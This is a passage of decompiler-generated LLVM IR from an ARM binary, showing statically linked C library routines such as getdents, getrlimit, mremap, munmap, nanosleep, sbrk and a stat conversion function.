; uselistorder directives
  uselistorder i32 %v0_150e0, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15118, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_1512c = load i32, i32* @r5, align 4
  %v18_1512c = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15164, label %dec_label_pc_15148

dec_label_pc_15148:                               ; preds = %entry
  %v1_1514c = sub i32 0, %arg1
  %v3_15150 = load i16, i16* @global_var_21d68.334, align 2
  %v4_15150 = sext i16 %v3_15150 to i32
  store i32 %v4_15150, i32* %r3.global-to-local, align 4
  %v0_15154 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_1515c = add i32 %v4_15150, %v0_15154
  %v4_1515c = inttoptr i32 %v3_1515c to i32*
  store i32 %v1_1514c, i32* %v4_1515c, align 4
  br label %dec_label_pc_151b8

dec_label_pc_15164:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_15164
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_1516c = add i32 %arg2, %arg1
  store i32 %v3_1516c, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15164, %bb
  %v1_151a84 = phi i32 [ %v18_1512c, %dec_label_pc_15164 ], [ %v3_1516c, %bb ]
  %v0_151a42 = phi i32 [ 141, %dec_label_pc_15164 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_151b8, label %dec_label_pc_151a4

dec_label_pc_15178:                               ; preds = %dec_label_pc_151a4
  %v1_151ac = inttoptr i32 %v1_151a4 to i8*
  %v1_15178 = add i32 %v0_15178, 8
  %v2_15178 = inttoptr i32 %v1_15178 to i16*
  %v3_15178 = load i16, i16* %v2_15178, align 2
  %v4_15178 = zext i16 %v3_15178 to i32
  %v2_1517c = add i32 %v4_15178, %v0_15178
  store i32 %v2_1517c, i32* @r3, align 4
  %v1_15180 = add i32 %v2_1517c, -1
  %v2_15180 = inttoptr i32 %v1_15180 to i8*
  %v3_15180 = load i8, i8* %v2_15180, align 1
  %v4_15180 = zext i8 %v3_15180 to i32
  store i32 %v4_15180, i32* @r4, align 4
  %v3_15184 = call i32 @strlen(i8* %v1_151ac)
  %v0_15188 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15188, i32* @r1, align 4
  %v1_1518c = add i32 %v3_15184, 1
  store i32 %v1_1518c, i32* @r2, align 4
  %v0_15190 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_15190, i32* @r0, align 4
  %v3_15194 = call i32 @memmove(i32 %v0_15190, i32 %v0_15188, i32 %v1_1518c)
  %v0_15198 = load i32, i32* %r7.global-to-local, align 4
  %v1_15198 = add i32 %v0_15198, 8
  %v2_15198 = inttoptr i32 %v1_15198 to i16*
  %v3_15198 = load i16, i16* %v2_15198, align 2
  %v4_15198 = zext i16 %v3_15198 to i32
  store i32 %v4_15198, i32* %r3.global-to-local, align 4
  %v0_1519c = load i32, i32* @r4, align 4
  %v1_1519c = trunc i32 %v0_1519c to i8
  %v3_1519c = add i32 %v0_15198, 10
  %v4_1519c = inttoptr i32 %v3_1519c to i8*
  store i8 %v1_1519c, i8* %v4_1519c, align 1
  %v0_151a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_151a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_151a0 = add i32 %v1_151a0, %v0_151a0
  store i32 %v2_151a0, i32* %r7.global-to-local, align 4
  %v1_151a8.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_151a4

dec_label_pc_151a4:                               ; preds = %.thread, %dec_label_pc_15178
  %v1_151a8 = phi i32 [ %v1_151a8.pre, %dec_label_pc_15178 ], [ %v1_151a84, %.thread ]
  %v0_15178 = phi i32 [ %v2_151a0, %dec_label_pc_15178 ], [ %v0_151a42, %.thread ]
  %v1_151a4 = add i32 %v0_15178, 10
  store i32 %v1_151a4, i32* %r6.global-to-local, align 4
  %v3_151a8 = icmp ult i32 %v0_15178, %v1_151a8
  %v1_151b0 = add i32 %v0_15178, 11
  store i32 %v1_151b0, i32* %r8.global-to-local, align 4
  br i1 %v3_151a8, label %dec_label_pc_15178, label %dec_label_pc_151b8

dec_label_pc_151b8:                               ; preds = %dec_label_pc_151a4, %.thread, %dec_label_pc_15148
  %v0_151b8 = load i32, i32* @r5, align 4
  store i32 %v6_1512c, i32* @r5, align 4
  store i32 %v18_1512c, i32* @sl, align 4
  ret i32 %v0_151b8

; uselistorder directives
  uselistorder i32 %v1_151a4, { 1, 0 }
  uselistorder i32 %v0_15178, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_1512c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @memmove, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_151a4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_151d0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_151dc = call i32 @getrlimit(i32 7, i32 %v2_151d0)
  %v1_151e0 = icmp slt i32 %v2_151dc, 0
  %v5_151e4 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_151e0, i32 256, i32 %v5_151e4
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_15208 = load i32, i32* @r0, align 4
  ret i32 %v1_15208
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_1521c = load i32, i32* @r0, align 4
  ret i32 %v1_1521c
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_15230 = load i32, i32* @r0, align 4
  ret i32 %v1_15230
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_15240 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 148) to i32*), align 4
  %v1_15244 = inttoptr i32 %v4_15240 to i32*
  %v2_15244 = load i32, i32* %v1_15244, align 4
  %v2_15248 = icmp eq i32 %v2_15244, 0
  br i1 %v2_15248, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_15250 = phi i32 [ %v2_15244, %entry ], [ 4096, %bb ]
  ret i32 %v1_15250

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15288, label %dec_label_pc_15270

dec_label_pc_15270:                               ; preds = %entry
  %v1_15274 = sub i32 0, %arg1
  %v3_15278 = load i16, i16* @global_var_21d68.334, align 2
  %v4_15278 = sext i16 %v3_15278 to i32
  %v0_1527c = call i32 @__aeabi_read_tp()
  %v3_15280 = add i32 %v4_15278, %v0_1527c
  %v4_15280 = inttoptr i32 %v3_15280 to i32*
  store i32 %v1_15274, i32* %v4_15280, align 4
  br label %dec_label_pc_15288

dec_label_pc_15288:                               ; preds = %entry, %dec_label_pc_15270
  %v1_1528c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_15270 ]
  ret i32 %v1_1528c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15288, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15294 = load i32, i32* @r7, align 4
  store i32 %v3_15294, i32* %stack_var_-8, align 4
  %v0_152a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_152a0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_152a0, -4095
  br i1 %tmp, label %dec_label_pc_152c8, label %dec_label_pc_152b0

dec_label_pc_152b0:                               ; preds = %entry
  %v0_152b4 = call i32 @__aeabi_read_tp()
  %v3_152b8 = load i16, i16* @global_var_21d68.334, align 2
  %v4_152b8 = sext i16 %v3_152b8 to i32
  store i32 %v4_152b8, i32* @r3, align 4
  %v0_152bc = load i32, i32* %r2.global-to-local, align 4
  %v1_152bc = sub i32 0, %v0_152bc
  store i32 %v1_152bc, i32* %r2.global-to-local, align 4
  %v3_152c0 = add i32 %v4_152b8, %v0_152b4
  %v4_152c0 = inttoptr i32 %v3_152c0 to i32*
  store i32 %v1_152bc, i32* %v4_152c0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_152c8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_152c8

dec_label_pc_152c8:                               ; preds = %entry, %dec_label_pc_152b0
  %v1_152cc = phi i32 [ %v0_152a0, %entry ], [ -1, %dec_label_pc_152b0 ]
  %v2_152c8 = phi i32 [ %v3_15294, %entry ], [ %v2_152c8.pre, %dec_label_pc_152b0 ]
  store i32 %v2_152c8, i32* @r7, align 4
  ret i32 %v1_152cc

; uselistorder directives
  uselistorder i32 %v0_152a0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_152c8, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_152e4 = load i32, i32* @r0, align 4
  ret i32 %v1_152e4
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_152e8 = load i32, i32* @r4, align 4
  store i32 %v3_152e8, i32* %stack_var_-12, align 4
  %v0_152f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_152f8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_152f8, -4095
  br i1 %tmp, label %dec_label_pc_15320, label %dec_label_pc_15308

dec_label_pc_15308:                               ; preds = %entry
  %v0_1530c = call i32 @__aeabi_read_tp()
  %v3_15310 = load i16, i16* @global_var_21d68.334, align 2
  %v4_15310 = sext i16 %v3_15310 to i32
  %v0_15314 = load i32, i32* %r2.global-to-local, align 4
  %v1_15314 = sub i32 0, %v0_15314
  store i32 %v1_15314, i32* %r2.global-to-local, align 4
  %v3_15318 = add i32 %v4_15310, %v0_1530c
  %v4_15318 = inttoptr i32 %v3_15318 to i32*
  store i32 %v1_15314, i32* %v4_15318, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15320.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15320

dec_label_pc_15320:                               ; preds = %entry, %dec_label_pc_15308
  %v1_15324 = phi i32 [ %v0_152f8, %entry ], [ -1, %dec_label_pc_15308 ]
  %v2_15320 = phi i32 [ %v3_152e8, %entry ], [ %v2_15320.pre, %dec_label_pc_15308 ]
  store i32 %v2_15320, i32* @r4, align 4
  ret i32 %v1_15324

; uselistorder directives
  uselistorder i32 %v0_152f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15320, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1532c = load i32, i32* @r7, align 4
  store i32 %v3_1532c, i32* %stack_var_-8, align 4
  %v0_15338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15338, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15338, -4095
  br i1 %tmp, label %dec_label_pc_15360, label %dec_label_pc_15348

dec_label_pc_15348:                               ; preds = %entry
  %v0_1534c = call i32 @__aeabi_read_tp()
  %v3_15350 = load i16, i16* @global_var_21d68.334, align 2
  %v4_15350 = sext i16 %v3_15350 to i32
  %v0_15354 = load i32, i32* %r2.global-to-local, align 4
  %v1_15354 = sub i32 0, %v0_15354
  store i32 %v1_15354, i32* %r2.global-to-local, align 4
  %v3_15358 = add i32 %v4_15350, %v0_1534c
  %v4_15358 = inttoptr i32 %v3_15358 to i32*
  store i32 %v1_15354, i32* %v4_15358, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15360.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15360

dec_label_pc_15360:                               ; preds = %entry, %dec_label_pc_15348
  %v1_15364 = phi i32 [ %v0_15338, %entry ], [ -1, %dec_label_pc_15348 ]
  %v2_15360 = phi i32 [ %v3_1532c, %entry ], [ %v2_15360.pre, %dec_label_pc_15348 ]
  store i32 %v2_15360, i32* @r7, align 4
  ret i32 %v1_15364

; uselistorder directives
  uselistorder i32 %v0_15338, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15360, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1536c = load i32, i32* @r7, align 4
  store i32 %v3_1536c, i32* %stack_var_-8, align 4
  %v0_15378 = load i32, i32* @r0, align 4
  store i32 %v0_15378, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15378, -4095
  br i1 %tmp, label %dec_label_pc_153a0, label %dec_label_pc_15388

dec_label_pc_15388:                               ; preds = %entry
  %v0_1538c = call i32 @__aeabi_read_tp()
  %v3_15390 = load i16, i16* @global_var_21d68.334, align 2
  %v4_15390 = sext i16 %v3_15390 to i32
  %v0_15394 = load i32, i32* %r2.global-to-local, align 4
  %v1_15394 = sub i32 0, %v0_15394
  store i32 %v1_15394, i32* %r2.global-to-local, align 4
  %v3_15398 = add i32 %v4_15390, %v0_1538c
  %v4_15398 = inttoptr i32 %v3_15398 to i32*
  store i32 %v1_15394, i32* %v4_15398, align 4
  %v2_153a0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_153a0

dec_label_pc_153a0:                               ; preds = %entry, %dec_label_pc_15388
  %v1_153a4 = phi i32 [ %v0_15378, %entry ], [ -1, %dec_label_pc_15388 ]
  %v2_153a0 = phi i32 [ %v3_1536c, %entry ], [ %v2_153a0.pre, %dec_label_pc_15388 ]
  store i32 %v2_153a0, i32* @r7, align 4
  ret i32 %v1_153a4

; uselistorder directives
  uselistorder i32 %v0_15378, { 1, 0, 2 }
  uselistorder label %dec_label_pc_153a0, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_153b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 12784) to i32*), align 4
  %v2_153bc = icmp eq i32 %v4_153b8, 0
  %v3_153c0 = load i32, i32* @r4, align 4
  %v9_153c0 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_153bc, label %dec_label_pc_153d0, label %entry.dec_label_pc_153d8_crit_edge

entry.dec_label_pc_153d8_crit_edge:               ; preds = %entry
  br label %dec_label_pc_153d8

dec_label_pc_153d0:                               ; preds = %entry
  store i32 %v3_153c0, i32* @r4, align 4
  store i32 %v9_153c0, i32* @r6, align 4
  %v0_153d4 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_153d8

dec_label_pc_153d8:                               ; preds = %entry.dec_label_pc_153d8_crit_edge, %dec_label_pc_153d0
  %v0_153d8 = call i32 @__libc_enable_asynccancel()
  %v0_153dc = load i32, i32* @r6, align 4
  store i32 %v0_153dc, i32* @r1, align 4
  store i32 %v0_153d8, i32* @r5, align 4
  %v0_153e4 = load i32, i32* @r4, align 4
  store i32 %v0_153e4, i32* @r0, align 4
  %v0_153e8 = call i32 @__syscall_nanosleep()
  store i32 %v0_153e8, i32* @r4, align 4
  %v0_153f0 = load i32, i32* @r5, align 4
  %v1_153f4 = call i32 @__libc_disable_asynccancel(i32 %v0_153f0)
  %v0_153f8 = load i32, i32* @r4, align 4
  ret i32 %v0_153f8

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 3, 8, 13, 1, 5, 4, 6, 7, 12, 2, 11, 10, 9, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 3, 8, 13, 1, 5, 4, 6, 7, 12, 2, 11, 10, 9, 0 }
  uselistorder label %dec_label_pc_153d8, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1540c = load i32, i32* @r4, align 4
  store i32 %v3_1540c, i32* %stack_var_-16, align 4
  store i32 11576, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r4.global-to-local, align 4
  %v4_1541c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 11576) to i32*), align 4
  %v2_15420 = icmp eq i32 %v4_1541c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_15420, label %dec_label_pc_1542c, label %dec_label_pc_1543c

dec_label_pc_1542c:                               ; preds = %entry
  %v1_15430 = call i32 @__GI_brk(i32 0)
  %v1_15434 = icmp slt i32 %v1_15430, 0
  br i1 %v1_15434, label %dec_label_pc_15460, label %dec_label_pc_1543cthread-pre-split

dec_label_pc_1543cthread-pre-split:               ; preds = %dec_label_pc_1542c
  %v0_15440.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_1543c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1543c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1543c

dec_label_pc_1543c:                               ; preds = %dec_label_pc_1543cthread-pre-split, %entry
  %v1_1543c = phi i32 [ %v1_1543c.pre, %dec_label_pc_1543cthread-pre-split ], [ 11576, %entry ]
  %v0_1543c = phi i32 [ %v0_1543c.pre, %dec_label_pc_1543cthread-pre-split ], [ ptrtoint (i32* @global_var_21d10.338 to i32), %entry ]
  %v1_15450 = phi i32 [ %v0_15440.pr, %dec_label_pc_1543cthread-pre-split ], [ %arg1, %entry ]
  %v2_1543c = add i32 %v0_1543c, %v1_1543c
  %v3_1543c = inttoptr i32 %v2_1543c to i32*
  %v4_1543c = load i32, i32* %v3_1543c, align 4
  %v2_15440 = icmp eq i32 %v1_15450, 0
  store i32 %v4_1543c, i32* %r4.global-to-local, align 4
  br i1 %v2_15440, label %dec_label_pc_15464, label %dec_label_pc_1544c

dec_label_pc_1544c:                               ; preds = %dec_label_pc_1543c
  %v2_15450 = add i32 %v4_1543c, %v1_15450
  %v1_15454 = call i32 @__GI_brk(i32 %v2_15450)
  %v1_15458 = icmp slt i32 %v1_15454, 0
  br i1 %v1_15458, label %dec_label_pc_15460, label %dec_label_pc_1544c.dec_label_pc_15464_crit_edge

dec_label_pc_1544c.dec_label_pc_15464_crit_edge:  ; preds = %dec_label_pc_1544c
  %v0_15464.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15464

dec_label_pc_15460:                               ; preds = %dec_label_pc_1544c, %dec_label_pc_1542c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15464

dec_label_pc_15464:                               ; preds = %dec_label_pc_1543c, %dec_label_pc_1544c.dec_label_pc_15464_crit_edge, %dec_label_pc_15460
  %v0_15464 = phi i32 [ %v0_15464.pre, %dec_label_pc_1544c.dec_label_pc_15464_crit_edge ], [ -1, %dec_label_pc_15460 ], [ %v4_1543c, %dec_label_pc_1543c ]
  %v2_15468 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15468, i32* @r4, align 4
  ret i32 %v0_15464

; uselistorder directives
  uselistorder i32 %v4_1543c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_15464, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_15488 = load i32, i32* @r0, align 4
  ret i32 %v1_15488
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1548c = load i32, i32* @r4, align 4
  store i32 %v3_1548c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_154a4 = inttoptr i32 %arg2 to i8*
  %v4_154a4 = call i32 @__GI_memset(i8* %v3_154a4, i32 0, i32 104)
  %v2_154a8 = load i32, i32* %arg1, align 4
  store i32 %v2_154a8, i32* %r3.global-to-local, align 4
  %v3_154a8 = add i32 %tmp, 4
  %v4_154a8 = inttoptr i32 %v3_154a8 to i32*
  %v5_154a8 = load i32, i32* %v4_154a8, align 4
  store i32 %v5_154a8, i32* %r4.global-to-local, align 4
  %v0_154ac = load i32, i32* %r5.global-to-local, align 4
  %v1_154ac = inttoptr i32 %v0_154ac to i32*
  store i32 %v2_154a8, i32* %v1_154ac, align 4
  %v3_154ac = add i32 %v0_154ac, 4
  %v4_154ac = inttoptr i32 %v3_154ac to i32*
  %v5_154ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_154ac, i32* %v4_154ac, align 4
  %v0_154b0 = load i32, i32* %r6.global-to-local, align 4
  %v1_154b0 = add i32 %v0_154b0, 12
  %v2_154b0 = inttoptr i32 %v1_154b0 to i32*
  %v3_154b0 = load i32, i32* %v2_154b0, align 4
  %v1_154b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_154b4 = add i32 %v1_154b4, 12
  %v3_154b4 = inttoptr i32 %v2_154b4 to i32*
  store i32 %v3_154b0, i32* %v3_154b4, align 4
  %v0_154b8 = load i32, i32* %r6.global-to-local, align 4
  %v1_154b8 = add i32 %v0_154b8, 96
  store i32 %v1_154b8, i32* %r3.global-to-local, align 4
  %v1_154bc = inttoptr i32 %v1_154b8 to i32*
  %v2_154bc = load i32, i32* %v1_154bc, align 4
  store i32 %v2_154bc, i32* %r3.global-to-local, align 4
  %v3_154bc = add i32 %v0_154b8, 100
  %v4_154bc = inttoptr i32 %v3_154bc to i32*
  %v5_154bc = load i32, i32* %v4_154bc, align 4
  store i32 %v5_154bc, i32* %r4.global-to-local, align 4
  %v1_154c0 = add i32 %v0_154b8, 56
  %v2_154c0 = inttoptr i32 %v1_154c0 to i32*
  %v3_154c0 = load i32, i32* %v2_154c0, align 4
  store i32 %v3_154c0, i32* %r2.global-to-local, align 4
  %v1_154c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_154c4 = add i32 %v1_154c4, 96
  %v3_154c4 = inttoptr i32 %v2_154c4 to i32*
  store i32 %v2_154bc, i32* %v3_154c4, align 4
  %v0_154c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_154c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_154c8 = add i32 %v1_154c8, 100
  %v3_154c8 = inttoptr i32 %v2_154c8 to i32*
  store i32 %v0_154c8, i32* %v3_154c8, align 4
  %v0_154cc = load i32, i32* %r6.global-to-local, align 4
  %v1_154cc = add i32 %v0_154cc, 24
  store i32 %v1_154cc, i32* %ip.global-to-local, align 4
  %v1_154d0 = inttoptr i32 %v1_154cc to i32*
  %v2_154d0 = load i32, i32* %v1_154d0, align 4
  store i32 %v2_154d0, i32* %ip.global-to-local, align 4
  %v3_154d0 = add i32 %v0_154cc, 28
  %v4_154d0 = inttoptr i32 %v3_154d0 to i32*
  %v5_154d0 = load i32, i32* %v4_154d0, align 4
  store i32 %v5_154d0, i32* %lr.global-to-local, align 4
  %v0_154d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_154d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_154d4 = add i32 %v1_154d4, 56
  %v3_154d4 = inttoptr i32 %v2_154d4 to i32*
  store i32 %v0_154d4, i32* %v3_154d4, align 4
  %v0_154d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_154d8 = add i32 %v0_154d8, 72
  store i32 %v1_154d8, i32* %r3.global-to-local, align 4
  %v1_154dc = add i32 %v0_154d8, 32
  store i32 %v1_154dc, i32* %r7.global-to-local, align 4
  %v1_154e0 = inttoptr i32 %v1_154dc to i32*
  %v2_154e0 = load i32, i32* %v1_154e0, align 4
  store i32 %v2_154e0, i32* %r7.global-to-local, align 4
  %v3_154e0 = add i32 %v0_154d8, 36
  %v4_154e0 = inttoptr i32 %v3_154e0 to i32*
  %v5_154e0 = load i32, i32* %v4_154e0, align 4
  store i32 %v5_154e0, i32* %r8.global-to-local, align 4
  %v1_154e4 = inttoptr i32 %v1_154d8 to i32*
  %v2_154e4 = load i32, i32* %v1_154e4, align 4
  %v3_154e4 = add i32 %v0_154d8, 76
  %v4_154e4 = inttoptr i32 %v3_154e4 to i32*
  %v5_154e4 = load i32, i32* %v4_154e4, align 4
  store i32 %v5_154e4, i32* %r1.global-to-local, align 4
  %v0_154e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_154e8 = add i32 %v0_154e8, 72
  %v1_154ec = inttoptr i32 %v1_154e8 to i32*
  store i32 %v2_154e4, i32* %v1_154ec, align 4
  %v3_154ec = add i32 %v0_154e8, 76
  %v4_154ec = inttoptr i32 %v3_154ec to i32*
  %v5_154ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_154ec, i32* %v4_154ec, align 4
  %v0_154f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_154f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_154f0 = add i32 %v1_154f0, 32
  %v3_154f0 = inttoptr i32 %v2_154f0 to i32*
  store i32 %v0_154f0, i32* %v3_154f0, align 4
  %v0_154f4 = load i32, i32* %r8.global-to-local, align 4
  %v1_154f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_154f4 = add i32 %v1_154f4, 36
  %v3_154f4 = inttoptr i32 %v2_154f4 to i32*
  store i32 %v0_154f4, i32* %v3_154f4, align 4
  %v0_154f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_154f8 = add i32 %v0_154f8, 80
  store i32 %v1_154f8, i32* %r3.global-to-local, align 4
  %v1_154fc = add i32 %v0_154f8, 48
  store i32 %v1_154fc, i32* %r7.global-to-local, align 4
  %v1_15500 = inttoptr i32 %v1_154fc to i32*
  %v2_15500 = load i32, i32* %v1_15500, align 4
  store i32 %v2_15500, i32* %r7.global-to-local, align 4
  %v3_15500 = add i32 %v0_154f8, 52
  %v4_15500 = inttoptr i32 %v3_15500 to i32*
  %v5_15500 = load i32, i32* %v4_15500, align 4
  store i32 %v5_15500, i32* %r8.global-to-local, align 4
  %v1_15504 = inttoptr i32 %v1_154f8 to i32*
  %v2_15504 = load i32, i32* %v1_15504, align 4
  %v3_15504 = add i32 %v0_154f8, 84
  %v4_15504 = inttoptr i32 %v3_15504 to i32*
  %v5_15504 = load i32, i32* %v4_15504, align 4
  store i32 %v5_15504, i32* %r1.global-to-local, align 4
  %v1_15508 = add i32 %v0_154f8, 16
  %v2_15508 = inttoptr i32 %v1_15508 to i32*
  %v3_15508 = load i32, i32* %v2_15508, align 4
  store i32 %v3_15508, i32* %r2.global-to-local, align 4
  %v0_1550c = load i32, i32* %r5.global-to-local, align 4
  %v1_1550c = add i32 %v0_1550c, 80
  %v1_15510 = inttoptr i32 %v1_1550c to i32*
  store i32 %v2_15504, i32* %v1_15510, align 4
  %v3_15510 = add i32 %v0_1550c, 84
  %v4_15510 = inttoptr i32 %v3_15510 to i32*
  %v5_15510 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15510, i32* %v4_15510, align 4
  %v0_15514 = load i32, i32* %r7.global-to-local, align 4
  %v1_15514 = load i32, i32* %r5.global-to-local, align 4
  %v2_15514 = add i32 %v1_15514, 48
  %v3_15514 = inttoptr i32 %v2_15514 to i32*
  store i32 %v0_15514, i32* %v3_15514, align 4
  %v0_15518 = load i32, i32* %r8.global-to-local, align 4
  %v1_15518 = load i32, i32* %r5.global-to-local, align 4
